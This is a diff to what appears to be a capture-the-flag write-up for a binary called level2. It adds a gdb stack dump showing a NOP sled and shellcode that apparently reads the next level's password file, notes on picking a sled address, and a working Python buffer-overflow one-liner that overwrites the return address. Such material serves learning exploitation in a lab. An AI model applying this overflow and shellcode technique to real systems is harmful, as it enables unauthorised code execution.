@@ -13,4 +13,29 @@ break main
 run
 x/1024x $ebp
 
-Finally, the epxloit: python -c 'print "a"*80 + "\xc0\x83\x04\x08" + "\x58\xf8\xff\xbf"' | ./level2
+0xbffff818:0x0036383669057977	0x2f656d6f682f0000
+0xbffff828:0x76656c2f72657375	0x6576656c2f326c65
+0xbffff838:0x4c4c45485300326c	0x9090903d45444f43
+0xbffff848:0x9090909090909090	0x9090909090909090
+0xbffff858:0x9090909090909090	0x9090909090909090
+0xbffff868:0x9090909090909090	0x9090909090909090
+0xbffff878:0x9090909090909090	0x9090909090909090
+0xbffff888:0x9090909090909090	0x9090909090909090
+0xbffff898:0x9090909090909090	0x9090909090909090
+0xbffff8a8:0xc931db3158466a90	0x580b6a5f21eb80cd
+0xbffff8b8:0xe689632d68665299	0x2f6868732f2f6852
+0xbffff8c8:0x565752e3896e6962	0xffdae880cde18953
+0xbffff8d8:0x682f20746163ffff	0x726573752f656d6f
+0xbffff8e8:0x2f336c6576656c2f	0x78653b737361702e
+0xbffff8f8:0x4c454853003b7469	0x622f6e69622f3d4c
+0xbffff908:0x4d52455400687361	0x322d6d726574783d
+0xbffff918:0x00726f6c6f633635	0x45494c435f485353
+
+We can see the nopsled begins at 0xbffff848. Better to pick an address in the
+middle of the sled as the stack can move a bit in between calls, so we can use
+878.
+
+Just need to overflow the buffer with 80 characters, overwrite EIP with the gets
+call and pass the nopsled address behing it.
+
+Exploit: python -c 'print "a"*80 + "\xc0\x83\x04\x08" + "\x78\xf8\xff\xbf"' | ./level2
